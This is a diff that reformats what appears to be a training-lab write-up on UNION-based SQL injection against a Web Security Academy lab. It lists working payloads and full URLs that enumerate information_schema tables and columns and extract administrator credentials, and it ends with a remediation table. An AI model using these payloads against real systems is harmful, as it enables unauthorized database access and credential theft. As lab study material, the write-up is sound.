@@ -64,6 +64,7 @@ SELECT name, description FROM products WHERE category = '[USER INPUT]'
 User input is injected directly without parameterization. A single quote `'` terminates the string literal, and a `UNION SELECT` clause appends attacker-controlled query results to the legitimate response. The `--` sequence comments out the remainder of the original query.
 
 **Conditions met for UNION attack:**
+
 - Query results are returned in the application response (in-band)
 - The number of columns and their data types can be matched
 - `information_schema` is accessible (non-Oracle database)
@@ -94,6 +95,7 @@ Query `information_schema.tables` to enumerate all user-defined tables in the da
 ```
 
 **Full URL:**
+
 ```
 https://0aff00eb037d2102843ef023001c00e4.web-security-academy.net/filter?category=Accessories%27union+select+table_name,null+from+information_schema.tables--
 ```
@@ -111,6 +113,7 @@ Query `information_schema.columns` filtered by the target table name to identify
 ```
 
 **Full URL:**
+
 ```
 https://0aff00eb037d2102843ef023001c00e4.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_cbcldv%27--
 ```
@@ -139,12 +142,12 @@ Used the extracted `administrator` credentials to authenticate at the applicatio
 
 ## Payloads Reference
 
-| Step | Payload |
-|---|---|
-| Column count test | `' UNION SELECT NULL,NULL--` |
-| List all tables | `' UNION SELECT table_name,NULL FROM information_schema.tables--` |
-| List columns | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--` |
-| Extract credentials | `' UNION SELECT username_col,password_col FROM users_cbcldv--` |
+| Step                | Payload                                                                                             |
+| ------------------- | --------------------------------------------------------------------------------------------------- |
+| Column count test   | `' UNION SELECT NULL,NULL--`                                                                        |
+| List all tables     | `' UNION SELECT table_name,NULL FROM information_schema.tables--`                                   |
+| List columns        | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--` |
+| Extract credentials | `' UNION SELECT username_col,password_col FROM users_cbcldv--`                                      |
 
 ---
 
@@ -152,25 +155,25 @@ Used the extracted `administrator` credentials to authenticate at the applicatio
 
 **Listing Tables**
 
-<img src="./screenshots/Listing Tables.png" width="700" alt="Listing all tables via information_schema">
+<img src="./evidence/Listing Tables.png" width="700" alt="Listing all tables via information_schema">
 
 ---
 
 **Listing Password Columns**
 
-<img src="./screenshots/Listing password columns.png" width="700" alt="Enumerating columns in users_cbcldv table">
+<img src="./evidence/Listing password columns.png" width="700" alt="Enumerating columns in users_cbcldv table">
 
 ---
 
 **Admin Password Extracted**
 
-<img src="./screenshots/admin password.png" width="700" alt="Administrator password extracted from database">
+<img src="./evidence/admin password.png" width="700" alt="Administrator password extracted from database">
 
 ---
 
 **Lab Solved**
 
-<img src="./screenshots/lab-solved.png" width="700" alt="Lab solved confirmation">
+<img src="./evidence/lab-solved.png" width="700" alt="Lab solved confirmation">
 
 ---
 
@@ -185,12 +188,12 @@ Used the extracted `administrator` credentials to authenticate at the applicatio
 
 ## Remediation
 
-| Issue | Fix |
-|---|---|
-| Unsanitized user input in SQL query | Use parameterized queries / prepared statements |
-| Error messages revealing DB structure | Suppress verbose database errors in production |
-| Credentials stored in plaintext | Hash passwords with bcrypt / Argon2 |
-| Unrestricted `information_schema` access | Apply least-privilege DB user permissions |
+| Issue                                    | Fix                                             |
+| ---------------------------------------- | ----------------------------------------------- |
+| Unsanitized user input in SQL query      | Use parameterized queries / prepared statements |
+| Error messages revealing DB structure    | Suppress verbose database errors in production  |
+| Credentials stored in plaintext          | Hash passwords with bcrypt / Argon2             |
+| Unrestricted `information_schema` access | Apply least-privilege DB user permissions       |
 
 ---
 
